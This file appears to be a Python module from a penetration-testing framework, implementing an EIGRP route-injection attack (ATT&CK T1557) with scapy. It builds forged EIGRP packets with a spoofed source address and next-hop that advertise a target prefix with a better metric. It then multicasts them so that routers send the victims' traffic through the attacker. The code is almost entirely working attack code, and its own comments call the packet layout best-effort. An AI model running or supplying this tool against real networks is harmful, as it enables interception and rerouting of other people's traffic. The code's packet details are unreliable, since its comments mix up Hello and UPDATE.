"""
EIGRP Route Injection — T1557

Injects EIGRP Hello + Internal route TLV advertising a target prefix
with a better metric, pulling traffic through the attacker (PE-CE /
campus EIGRP domains).

Best-effort packet layout (classic EIGRP, AS match required).
Lab validation REQUIRED: match AS number + K-values + auth of target.
Supports --dry-run to inspect with Wireshark before sending.

Mitigation: EIGRP MD5/HMAC-SHA auth, passive-interface on access,
distribute-list filtering; prefer authenticated OSPF.
"""
import struct
import time

from scapy.all import Ether, IP, Raw, sendp, hexdump

NAME = "eigrp"
DESCRIPTION = "EIGRP route injection — pull prefix via forged internal route"
ATTCK_ID = "T1557"

MCAST_MAC = "01:00:5e:00:00:0a"
MCAST_IP = "224.0.0.10"


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help=f"{DESCRIPTION} ({ATTCK_ID})",
                              description=__doc__)
    p.add_argument("-i", "--interface", required=True)
    p.add_argument("--asn", type=int, required=True, help="EIGRP AS number (must match domain)")
    p.add_argument("-n", "--network", required=True, help="Prefix to announce, e.g. 10.0.0.0/24")
    p.add_argument("-s", "--spoof-ip", required=True, help="Spoofed source (= injected next-hop)")
    p.add_argument("--router-id", default="1.1.1.1", help="Attacker router-ID")
    p.add_argument("--interval", type=float, default=5.0)
    p.add_argument("-c", "--count", type=int, default=6)
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--verbose", "-v", action="store_true")
    add_engagement_args(p)
    p.set_defaults(func=run)


def _ip_to_bytes(ip):
    return bytes(int(x) for x in ip.split("."))


def _build_eigrp(asn, network, spoof_ip, router_id):
    import ipaddress
    net = ipaddress.IPv4Network(network, strict=False)
    # EIGRP header: ver=2 op=1(Hello, keeps adjacency) ... simplified UPDATE op=1 with TLV
    # ver op chksum flags seq ack rid asn
    eigrp_hdr = struct.pack("!BBHIIIII", 2, 1, 0, 0, 1, 0,
                            struct.unpack("!I", _ip_to_bytes(router_id))[0], asn)
    # Internal route TLV (type 0x0102): metric block + prefix
    # delay (huge=good low delay wins) — use minimal delay to win
    prefix_b = net.network_address.packed
    plen = net.prefixlen
    tlv_body = struct.pack("!IIIII", 10, 100, 1, 1, 1500)  # delay,bw,mtu,hop,rel,load
    tlv_body += struct.pack("!BBB", 0, 0, plen) + prefix_b[: (plen + 7) // 8 if plen else 0]
    tlv_body += _ip_to_bytes(spoof_ip)  # next-hop
    tlv = struct.pack("!HH", 0x0102, 4 + len(tlv_body)) + tlv_body
    return eigrp_hdr + tlv


def run(args, logger):
    from core.common import require_root
    require_root()
    logger.info("START | technique=%s | iface=%s | asn=%d | net=%s | spoof=%s",
                ATTCK_ID, args.interface, args.asn, args.network, args.spoof_ip)
    body = _build_eigrp(args.asn, args.network, args.spoof_ip, args.router_id)
    pkt = Ether(dst=MCAST_MAC) / IP(src=args.spoof_ip, dst=MCAST_IP, proto=88, ttl=2) / Raw(load=body)
    if args.dry_run:
        logger.info("--dry-run: EIGRP UPDATE preview")
        pkt.show()
        hexdump(bytes(body))
        logger.warning("EIGRP layout is best-effort — validate against lab capture first.")
        return 0
    try:
        for i in range(args.count):
            sendp(pkt, iface=args.interface, verbose=args.verbose)
            logger.info("[EIGRP] UPDATE %d/%d", i + 1, args.count)
            time.sleep(args.interval)
        logger.info("END | success=True — check 'show ip eigrp topology' on peer")
        return 0
    except Exception as e:
        logger.error("[EIGRP] Error: %s", e)
        return 1
